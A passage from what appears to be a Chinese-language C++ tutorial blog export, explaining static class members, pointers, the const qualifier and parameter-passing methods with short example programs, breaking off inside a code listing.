title="二：面向对象的static关键（类中的static关键字）"></a>二：面向对象的static关键（类中的static关键字）</h1><h2 id="2-1静态数据成员"><a href="#2-1静态数据成员" class="headerlink" title="2.1静态数据成员"></a>2.1静态数据成员</h2><p>在类内数据成员的声明前加上关键字static，该数据成员就是类内的静态数据成员。先举一个静态数据成员的例子。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">class Myclass &#123;</span><br><span class="line">public:</span><br><span class="line">    Myclass(int a, int b, int c);</span><br><span class="line">    void GetSum();</span><br><span class="line">private:</span><br><span class="line">    int a, b, c;</span><br><span class="line">    static int Sum;&#x2F;&#x2F;声明一个静态数据成员</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int Myclass::Sum &#x3D; 0;&#x2F;&#x2F;定义并初始化静态数据成员</span><br><span class="line"></span><br><span class="line">Myclass::Myclass(int a, int b, int c) &#123;</span><br><span class="line">    this-&gt;a &#x3D; a;</span><br><span class="line">    this-&gt;b &#x3D; b;</span><br><span class="line">    this-&gt;c &#x3D; c;</span><br><span class="line">    Sum+&#x3D; a + b + c;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void Myclass::GetSum() &#123;</span><br><span class="line">    cout &lt;&lt; &quot;Sum&#x3D;&quot; &lt;&lt; Sum &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    Myclass M(1, 2, 3);</span><br><span class="line">    M.GetSum();</span><br><span class="line">    Myclass N(4, 5, 6);</span><br><span class="line">    N.GetSum();</span><br><span class="line">    M.GetSum();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​                    给出运行的截图</p><p> <img src="/2017/04/10/C-%E4%B8%ADstatic%E5%85%B3%E9%94%AE%E5%AD%97/C-%E4%B8%ADstatic%E5%85%B3%E9%94%AE%E5%AD%97%5CC++%E9%9D%99%E6%80%81%E6%95%B0%E6%8D%AE%E6%88%90%E5%91%98.png" alt="C++静态数据成员"></p><hr><h3 id="可以看出，静态数据成员有以下特点："><a href="#可以看出，静态数据成员有以下特点：" class="headerlink" title="可以看出，静态数据成员有以下特点："></a>可以看出，静态数据成员有以下特点：</h3><ul><li><p><strong>1</strong>.对于<strong>非静态数据成员，每个类对象都有自己的拷贝</strong>。而静态数据成员被当作是类的成员。无论这个类的对象被定义了多少个，<strong>静态数据成员在程序中也只有一份拷贝</strong>，由该类型的所有对象共享访问。也就是说，静态数据成员是该类的所有对象所共有的。对该类的多个对象来说，静态数据成员只分配一次内存，供所有对象共用。所以，静态数据成员的值对每个对象都是一样的，它的值可以更新； </p></li><li><p>**2.**静态数据成员存储在全局数据区。静态数据成员定义时要分配空间，所以不能在类声明中定义。在上述中，语句int Myclass::Sum=0;是定义静态数据成员； </p><ul><li><p><code>注意：</code>由于静态成员声明于类中，操作于其外，所以对其取地址操作，就多少有些特殊，变量地址是指向其数据类型的指针 ，函数地址类型是一个“nonmember函数指针”。</p><p>​</p></li></ul></li><li><p><strong>3</strong>.静态数据成员和普通数据成员一样遵从public,protected,private访问规则； </p></li><li><p><strong>4.**因为静态数据成员在全局数据区分配内存，属于本类的所有对象</strong>共享<strong>，所以，它</strong>不属于特定的类对象**，在没有产生类对象时其作用域就可见，即在<code>没有产生类的实例时，我们就可以操作它</code>； </p></li><li><p>**5.**静态数据成员初始化与一般数据成员初始化不同。静态数据成员初始化的<code>格式为</code>：</p><p>静态数据成员初始化与一般数据成员初始化不同。静态数据成员初始化的格式为：<br><code>＜数据类型＞＜类名＞::＜静态数据成员名＞=＜值＞  </code>如果静态数据成员的访问权限允许的话（即public的成员），可在程序中，按上述格式来引用静态数据成员 ； </p><p>调用静态成员函数，可以用成员访问操作符(.)和(-&gt;)为一个类的对象或指向类对象的指针调用静态成员函数,也可以用类名::函数名调用(因为他本来就是属于类的，用类名调用很正常)</p><p>​</p><ul><li><p><strong>6.</strong> 静态数据成员主要用在各个对象都有相同的某项属性的时候。比如对于一个存款类，每个实例的利息都是相同的。所以，应该把利息设为存款类的静态数据成员。这有两个好处，第一，不管定义多少个存款类对象，利息数据成员都共享分配在全局数据区的内存，所以节省存储空间。第二，一旦利息需要改变时，只要改变一次，则所有存款类对象的利息全改变过来了；的 </p><ul><li><p>**7.**同全局变量相比，使用静态数据成员有两个优势： </p><p>（1） 静态数据成员没有进入程序的全局名字空间，因此不存在与程序中其它全局名字冲突的可能性；<br>（2）可以实现信息隐藏。静态数据成员可以是private成员，而全局变量不能；</p><p>​</p><h2 id="2-2-静态成员函数"><a href="#2-2-静态成员函数" class="headerlink" title="2.2 静态成员函数"></a>2.2 静态成员函数</h2><p>​    与静态数据成员一样，我们也可以创建一个静态成员函数，*<strong><u>它为类的全部服务而不是为某一个类的具体对象服务</u>*<strong>。静态成员函数与静态数据成员一样，都是类的</strong>内部实现<strong>，属于类定义的一部分。</strong><u>普通的成员函数一般都隐含了一个this指针</u><strong>，this指针指向类的对象本身，因为普通成员函数总是具体的属于某个类的具体对象的。通常情况下，this是</strong>缺省*<em>的。如函数fn()实际上是this-&gt;fn()。但是与普通函数相比，</em></strong><u>静态成员函数由于不是与任何的对象相联系，因此它不具有this指针</u>***。从这个意义上讲，它无法访问属于类对象的非静态数据成员，也无法访问非静态成员函数，它只能调用其余的静态成员函数（<code>静态成员函数不能访问非静态(包括成员函数和数据成员)，但是非静态可以访问静态.因为静态是属于类的，它是不知道你创建了10个还是100个对象</code>，所以它对你对象的函数或者数据是一无所知的，所以它没办法调用，而反过来，<code>你创建的对象是对类一清二楚的(不然你怎么从它那里实例化呢)，所以你是可以调用类函数和类成员的</code>，就像不管是不是static，都可以调用static的变量一样）。下面举个静态成员函数的例子。</p></li></ul></li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">class Myclass &#123;</span><br><span class="line">public:</span><br><span class="line">    Myclass(int a, int b, int c);</span><br><span class="line">    static void GetSum();</span><br><span class="line">private:</span><br><span class="line">    int a, b, c;</span><br><span class="line">    static int Sum;&#x2F;&#x2F;声明一个静态数据成员</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int Myclass::Sum &#x3D; 0;&#x2F;&#x2F;定义并初始化静态数据成员</span><br><span class="line"></span><br><span class="line">Myclass::Myclass(int a, int b, int c) &#123;</span><br><span class="line">    this-&gt;a &#x3D; a;</span><br><span class="line">    this-&gt;b &#x3D; b;</span><br><span class="line">    this-&gt;c &#x3D; c;</span><br><span class="line">    Sum+&#x3D; a + b + c;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void Myclass::GetSum() &#123;</span><br><span class="line">    cout &lt;&lt; &quot;Sum&#x3D;&quot; &lt;&lt; Sum &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    Myclass M(1, 2, 3);</span><br><span class="line">    M.GetSum();</span><br><span class="line">    Myclass N(4, 5, 6);</span><br><span class="line">    N.GetSum();</span><br><span class="line">    Myclass::GetSum();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <img src="/2017/04/10/C-%E4%B8%ADstatic%E5%85%B3%E9%94%AE%E5%AD%97/C-%E4%B8%ADstatic%E5%85%B3%E9%94%AE%E5%AD%97%5CC++%E9%9D%99%E6%80%81%E5%87%BD%E6%95%B0.png" alt="C++静态函数"></p><h3 id="关于静态成员变量，可以总结为以下几点："><a href="#关于静态成员变量，可以总结为以下几点：" class="headerlink" title="关于静态成员变量，可以总结为以下几点："></a>关于静态成员变量，可以总结为以下几点：</h3><ul><li><p>1.出现在类体外的函数定义不能指定关键字static</p></li><li><p>2.静态成员之间可以互相访问，包括静态成员函数访问静态数据成员和访问静态成员函数</p></li><li><p>3.非静态成员函数可以任意地访问静态成员函数和静态数据成员</p></li><li><p>4.静态成员函数不能访问非静态成员函数和非静态数据成员</p></li><li><p>5.由于没有this指针的额外开销，因此静态成员函数与类的全局函数相比速度上会有少许的增长（这个我下面会用例子来说明）</p><p><code>在这里补充一点</code>：由于静态成员函数没有this指针，所以就差不多等同于nonmember函数，结果就产生了一个意想不到的好处：成为一个callback函数，使得我们得以将C++和C-based X Window系统结合，同时也成功的应用于线程函数身上。</p></li><li><p>6.静态成员函数，可以用成员访问操作符(.)和（-&gt;）为一个类的对象或指向类对象的指针调用静态成员函数，也可以直接使用如下格式：</p><p>&lt;类名&gt;::&lt;静态成员函数名&gt;(&lt;参数表&gt;)调用类的静态成员函数</p></li></ul><p>下面的这个例子用来说明上述中的第五点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;注意这两个头文件不要顺序颠倒，不然无法编译过去，你可以自己试一试</span><br><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include&lt;iostream&gt; </span><br><span class="line">using namespace std;</span><br><span class="line">class Rectangle</span><br><span class="line">&#123;</span><br><span class="line">private:</span><br><span class="line">    int m_w, m_h;</span><br><span class="line">    static int s_sum;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">    Rectangle(int w, int h)</span><br><span class="line">    &#123;</span><br><span class="line">        this-&gt;m_w &#x3D; w;</span><br><span class="line">        this-&gt;m_h &#x3D; h;</span><br><span class="line">        s_sum +&#x3D; (this-&gt;m_w * this-&gt;m_h);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">void GetSum()</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; &quot;sum &#x3D; &quot; &lt;&lt; s_sum &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int Rectangle::s_sum &#x3D; 0;  &#x2F;&#x2F;初始化  </span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    cout &lt;&lt; &quot;sizeof(Rectangle)&#x3D;&quot; &lt;&lt; sizeof(Rectangle) &lt;&lt; endl;</span><br><span class="line">    Rectangle *rect1 &#x3D; new Rectangle(3, 4);</span><br><span class="line">    rect1-&gt;GetSum();</span><br><span class="line">    cout &lt;&lt; &quot;sizeof(rect1)&#x3D;&quot; &lt;&lt; sizeof(*rect1) &lt;&lt; endl;</span><br><span class="line">    Rectangle rect2(2, 3);</span><br><span class="line">    rect2.GetSum();</span><br><span class="line">    cout &lt;&lt; &quot;sizeof(rect2)&#x3D;&quot; &lt;&lt; sizeof(rect2) &lt;&lt; endl;</span><br><span class="line">    system(&quot;pause&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <img src="/2017/04/10/C-%E4%B8%ADstatic%E5%85%B3%E9%94%AE%E5%AD%97/C-%E4%B8%ADstatic%E5%85%B3%E9%94%AE%E5%AD%97%5C%E9%9D%99%E6%80%81%E5%8F%98%E9%87%8F%E8%8A%82%E7%BA%A6%E5%86%85%E5%AD%98%E7%A9%BA%E9%97%B4.png" alt="静态变量节约内存空间"></p><p>由图可知：sizeof(Rectangle)=8bytes=sizeof(m_w)+sizeof(m_h)。也就是说 <code>static 并不占用Rectangle的内存空间</code>。</p><p>那么static在哪里分配内存的呢？是的，<code>全局数据区(静态区)</code>。</p><p>再看看GetSum()，第一次12=3<em>4，第二次18=12+2</em>3。由此可得，static只会被初始化一次，于实例无关。</p><h3 id="结论："><a href="#结论：" class="headerlink" title="结论："></a>结论：</h3><p>对于非静态数据成员，每个类对象(实例)都有自己的拷贝。而静态数据成员被当作是类的成员，由该类型的所有对象共享访问,对该类的多个对象来说，静态数据成员只分配一次内存。</p><p>静态数据成员存储在全局数据区。<code>静态数据成员定义时要分配空间</code>，所以不能在类声明中定义。</p><p>也就是说，你每new一个Rectangle，并不会为static int s_sum的构建一份内存拷贝，它是不管你new了多少Rectangle的实例，因为它<code>只与类Rectangle挂钩</code>，而跟你每一个Rectangle的对象没关系。</p>]]></content>
      
      
      <categories>
          
          <category> static </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>-神奇的指针-</title>
      <link href="/2017/04/05/%E5%88%9D%E8%AF%86%E6%8C%87%E9%92%88/"/>
      <url>/2017/04/05/%E5%88%9D%E8%AF%86%E6%8C%87%E9%92%88/</url>
      
        <content type="html"><![CDATA[<h3 id="什么是指针？"><a href="#什么是指针？" class="headerlink" title="什么是指针？"></a>什么是指针？</h3><ul><li><p>指针就是一个变量，所有变量拥有的类型指针都一样拥有的</p><a id="more"></a><h3 id="指针既然是变量，那么它可以存储什么内容"><a href="#指针既然是变量，那么它可以存储什么内容" class="headerlink" title="指针既然是变量，那么它可以存储什么内容"></a>指针既然是变量，那么它可以存储什么内容</h3></li><li><p>指针可以存储地址—–没错就是地址（操作系统中用来 标识RAM存储单元的二进制，就好像个人的地址标识他居住地一样）</p><h3 id="准备接受一个思想"><a href="#准备接受一个思想" class="headerlink" title="准备接受一个思想"></a>准备接受一个思想</h3></li></ul><ul><li><p>我们知道，定义为内存中某个位置的变量，它的值可以由程序员改变。当在x上使用取地址运算符（即&amp;x）时，它实际上指的是内存中保存x的位置的地址</p><h3 id="给几个概念来撸个串"><a href="#给几个概念来撸个串" class="headerlink" title="给几个概念来撸个串"></a>给几个概念来撸个串</h3></li></ul><p>这里将介绍变量名称、位置、某位置处的值和位置的地址这些概念。因为这些都通过结合图形更好的理解</p><p> <img src="/2017/04/05/%E5%88%9D%E8%AF%86%E6%8C%87%E9%92%88/%E5%88%9D%E8%AF%86%E6%8C%87%E9%92%88%5CRAM.png" alt="RAM"></p><p> <img src="/2017/04/05/%E5%88%9D%E8%AF%86%E6%8C%87%E9%92%88/%E5%88%9D%E8%AF%86%E6%8C%87%E9%92%88%5C%E6%8C%87%E9%92%88%E6%A6%82%E5%BF%B5.png" alt="指针概念"></p><h3 id="大家一定要记住指针就是位置"><a href="#大家一定要记住指针就是位置" class="headerlink" title="大家一定要记住指针就是位置"></a>大家一定要记住指针就是位置</h3><p>当在代码中使用位置时，他们的行为取决于它们位于代码的什么地方。如果它们出现在=复制运算符的左边，那么它们的行为和出现在其他地方的行为大相径庭。如果它们*<strong><u>没有出现在赋值运算符的左边</u>**<em>，那么这个位置将被该位置上的值取代。例如，如果x为3，那么在表达式：<code>y=x + 5</code>中，x被它的位置（或者内存单元）上的值取代，即3，然后得到结果8并赋予y。但是，</em></strong><u>如果位置出现在赋值运算符的左边</u>***，它就不应该被该位置上的值取代。例如，若y为10，那么表达式：y=x+5；将不会替换为10=x+5</p><h3 id="取址运算符"><a href="#取址运算符" class="headerlink" title="取址运算符 *"></a>取址运算符 *</h3><ul><li>该运算符可以应用于指针（或者能够产生地址的表达式）。该运算的结果是一个位置。大多数运算的结果是某种类型的值。结果位置是解析地址的位置。因此，如果将x的地址赋予ptr，即：<code>ptr = &amp; x；</code>那么*ptr将是为x保留的位置。<ul><li>既然取指针内容运算符*可以获得位置作为结果，所以它的行为取决于它在代码中的位置。请看下述示例：    </li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int x,*ptr;</span><br><span class="line">x &#x3D; 3;</span><br><span class="line">ptr &#x3D; &amp;x;</span><br></pre></td></tr></table></figure><p>在这一段代码之后，如果 不在赋值运算符的左边使用<em>ptr，那么它仅是一个变量（位置），提供在结果位置处存储的值。在表达式：<code>y = *ptr + 5</code>中，运算</em>ptr得到保存x的位置。因此，运算*ptr将被值3（之前赋给x的值）取代.如果</p><p>*ptr出现在赋值运算符的左边，如表达式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* ptr &#x3D; 10 + z;</span><br></pre></td></tr></table></figure><p>所示，那么它就只是赋值左边的一个变量（位置）：它只被用作一个位置，而10+z的结果将存储在为x保留在位置上。但是这里要注意：通过指针，x的值可以由前面的代码修改。如果z为5，那么x的值变为15</p><p>  <img src="/2017/04/05/%E5%88%9D%E8%AF%86%E6%8C%87%E9%92%88/%E5%88%9D%E8%AF%86%E6%8C%87%E9%92%88%5C%E5%8F%96%E6%8C%87%E9%92%88%E5%86%85%E5%AE%B9%E7%BB%93%E6%9E%9C.png" alt="取指针内容结果"></p><h4 id="思考一个问题，我们都知道数组名存储的是地址，而且还是第一个元素的地址，所以数组的名称是否是指针呢？"><a href="#思考一个问题，我们都知道数组名存储的是地址，而且还是第一个元素的地址，所以数组的名称是否是指针呢？" class="headerlink" title="思考一个问题，我们都知道数组名存储的是地址，而且还是第一个元素的地址，所以数组的名称是否是指针呢？"></a>思考一个问题，我们都知道数组名存储的是地址，而且还是第一个元素的地址，所以数组的名称是否是指针呢？</h4><ul><li>回答：不是。虽然它是地址。原因在于指针定义为一个存储地址的变量。名称“变量”就暗含着它的值是可以变的。但是我们不能在数组中存储一个不同地址</li></ul>]]></content>
      
      
      <categories>
          
          <category> 指针 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>-const限定符-</title>
      <link href="/2017/04/05/const%E9%99%90%E5%AE%9A%E7%AC%A6/"/>
      <url>/2017/04/05/const%E9%99%90%E5%AE%9A%E7%AC%A6/</url>
      
        <content type="html"><![CDATA[<h3 id="const关键字有什么作用"><a href="#const关键字有什么作用" class="headerlink" title="const关键字有什么作用"></a>const关键字有什么作用</h3><ul><li>意味着告诉编译器当函数执行时，类的这些数据成员不会改变。这个看上去是没有那么重要，但是它是一个类实现后，帮助调试类的优秀工具。下面我们来讨论一下原因</li></ul><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if( numDependents &#x3D; 3)</span><br></pre></td></tr></table></figure><p>​    </p><ul><li>假定Tax类的私有部分中定义了一个称为numDependents的变量。在一个称为threeDependents的类函数中，我们希望比较numDenpendents，查看它是否等于3，但是我们在编写if语句头时犯了一个错误，如上代码所示</li></ul><h3 id="看看这样执行后的情况"><a href="#看看这样执行后的情况" class="headerlink" title="看看这样执行后的情况"></a>看看这样执行后的情况</h3><ul><li>本意是想使用相等运算符==的，一步小心就使用了赋值运算符=，就按这种方式来看看程序的运行情况。if中没有什么错误，因为赋值运算符生成了一个结果，而这个结果取代了表达式numDependents=3.它将不再只是将3赋予numDenpendts；它生成了一个结果，就像是3+4得到结果7一样。赋值的结果碰巧就是赋给左边的内容。</li></ul><ul><li>因此，**<u><em>当if语句执行时，它会完成两个操作</em></u>**：将3赋予numDenpents，然后对if（3）求值。在C++中，认为所有非0的数都为true，所以编译器认为if语句没有错误，而在这种错误情形中，条件始终未真。因此，该错误变为了运行时错误</li></ul><ul><li>我们假定如果numDenpents为3，那么函数将返回true，否则返回false。很明显，该函数并不想改变私有部分中的任何数据成员。但是由于if语句的编写错误却使该函数意外的对一个数据成员进行了修改。如果在<strong>类的尾部</strong>使用了const，那么就告诉了编译器这个类的数据成员不能修改。如果代码中由于失误去修改数据成员，那么编译器就会捕捉到并会报错。<strong>const限定符应该位于类定义中的函数原型的尾部，而且也应该位于类实现文件中函数头的尾部</strong></li></ul><ul><li><p>但在函数头中使用const限定符时，不会对函数调用的方式做任何改变。主程序在调用函数时不用再函数调用前面使用const</p><p>###还有一个对const的使用值得注意的</p></li><li><p>当将对象（无论是结构还是类对象）作为参数传递时，常见的做法是尽可能地按传址方式传递他们。按传址方式传递对象（此时按传值方式传递对象也是可以的）的原因在于对象可以非常庞大，用有很多数据成员。当对象<strong>按传值方式传递时，需要复制对象</strong>，这意味着对象的每个数据成员都要复制，对于大的对象来说，这可能需要花费一段时间，因此按传址方式传递对象时，程序可以获得一点性能方面的提升。这种情况下，只需要复制对象的地址。</p></li></ul><ul><li>这就是说，如果函数内部的对象不需要改变，那么在函数头中参数前面应该加上const。如果参数前面没有加const，而对象改变了，那么这种改变就会映射到调用函数中（因为对象是按传址方式传递的），此时错误将转换为运行时错误。如果加了const了，那么当修改了，就会发生错误，不再是运行时的错误。</li></ul>]]></content>
      
      
      <categories>
          
          <category> const </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>-常见的几种函数参数调用方式-</title>
      <link href="/2017/04/04/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F/"/>
      <url>/2017/04/04/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<ul><li><p>1 值传递</p></li><li><p>2 指针传递</p></li><li><p>3 引用传递</p><a id="more"></a><p>**<u>根本区别</u>**：函数值传递不改变函数值，如果想改变变量值，需要返回值，然后用变量接受这个返回值。而指针传递和引用传递都可以在函数内改变变量值，不需要通过返回值的形式改变</p><p>**<u><em>应用场合</em></u>**：当想通过调用的函数，改变几个变量的值，多个变量都通过函数返回值来改变变量值方式费时费力，所以此时这个时候指针和引用就显示出他们的优势来</p></li></ul><p>那么下面就分别来简单的总结一下这三种函数参数的调用方式</p><h3 id="一：值传递"><a href="#一：值传递" class="headerlink" title="一：值传递"></a>一：值传递</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> void changeVar(int myVar,int newValue)&#123;</span><br><span class="line">  myVar &#x3D; newValue;  &#x2F;&#x2F;值传递，没有返回值，起不到改变变量的作用</span><br><span class="line">&#125;; </span><br><span class="line"> </span><br></pre></td></tr></table></figure><p> 给一个图形解释：<img src="/2017/04/04/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F%5C%E4%BC%A0%E5%80%BC%E8%B0%83%E7%94%A81.png" alt="传值调用1"></p><p>myCar对象中的数据成员在调用时生成。因为函数调用是按传值方式，而不是按传递址方式进行的，所以（在foo函数头中）创建了car对象，并将myCar(实参)中数据成员的值复制到car（形参）中。因此这种传递会有一个我们常常说的“副本”</p><p><strong>（思考：如果对象的数据成员中含有指针数据时，这种方式会有什么问题）</strong></p><h3 id="二-指针传递"><a href="#二-指针传递" class="headerlink" title="二:指针传递"></a>二:指针传递</h3><p>​    ①写一个很简单的例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">void swap(int *a, int *b) &#123;</span><br><span class="line">    cout &lt;&lt; &quot;********************之前********************&quot; &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;a&#x3D;&quot; &lt;&lt; a &lt;&lt; &quot;,&quot; &lt;&lt; &quot;b&#x3D;&quot; &lt;&lt; b &lt;&lt; endl &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;*a&#x3D;&quot; &lt;&lt; *a &lt;&lt; &quot;,&quot; &lt;&lt; &quot;*b&quot; &lt;&lt; *b &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;&amp;a&#x3D;&quot; &lt;&lt; &amp;a &lt;&lt; &quot;,&quot; &lt;&lt; &quot;&amp;b&#x3D;&quot; &lt;&lt; &quot;,&quot; &lt;&lt; &amp;b &lt;&lt; endl;</span><br><span class="line">    int temp;</span><br><span class="line">    temp &#x3D; *a;</span><br><span class="line">    *a &#x3D; *b;</span><br><span class="line">    *b &#x3D; temp;</span><br><span class="line">    cout &lt;&lt; &quot;********************交换后********************&quot; &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;a&#x3D;&quot; &lt;&lt; a &lt;&lt; &quot;,&quot; &lt;&lt; &quot;b&#x3D;&quot; &lt;&lt; b &lt;&lt; endl&lt;&lt;endl;</span><br><span class="line">    cout &lt;&lt; &quot;*a&#x3D;&quot; &lt;&lt; *a &lt;&lt; &quot;,&quot; &lt;&lt; &quot;*b&quot; &lt;&lt; *b &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;&amp;a&#x3D;&quot; &lt;&lt; &amp;a &lt;&lt; &quot;,&quot; &lt;&lt; &quot;&amp;b&#x3D;&quot; &lt;&lt; &quot;,&quot; &lt;&lt; &amp;b &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int i &#x3D; 1, j &#x3D; 2;</span><br><span class="line">    cout &lt;&lt; &quot;i&#x3D;&quot; &lt;&lt; i &lt;&lt; &quot;,&quot; &lt;&lt; &quot;j&#x3D;&quot; &lt;&lt; j &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;&amp;i&quot; &lt;&lt; &amp;i &lt;&lt; &quot;,&quot; &lt; &quot;&amp;j&quot; &lt;&lt; &quot;,&quot; &lt;&lt; &amp;j;</span><br><span class="line">    swap(&amp;i, &amp;j);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>指针用来传地址的，下面是运行结果的代码  <img src="/2017/04/04/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F%5C%E6%8C%87%E9%92%88%E4%BC%A0%E5%80%BC%E7%BB%93%E6%9E%9C%E6%88%AA%E5%9B%BE1.png" alt="指针传值结果截图1"></p><p>形如 int *a=&x;  </p><p> //用于指针传递，a有自己独立的内存空间，存储的是x的内容，*a存x的值</p><p>下面对这个结果进行一个分析</p><p> <img src="/2017/04/04/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F%5C%E6%8C%87%E9%92%88%E4%BC%A0%E5%80%BC%E5%88%86%E6%9E%90.png" alt="指针传值分析"></p><p>​    ②第二个例子，大家先看看代码，想一想运行的结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 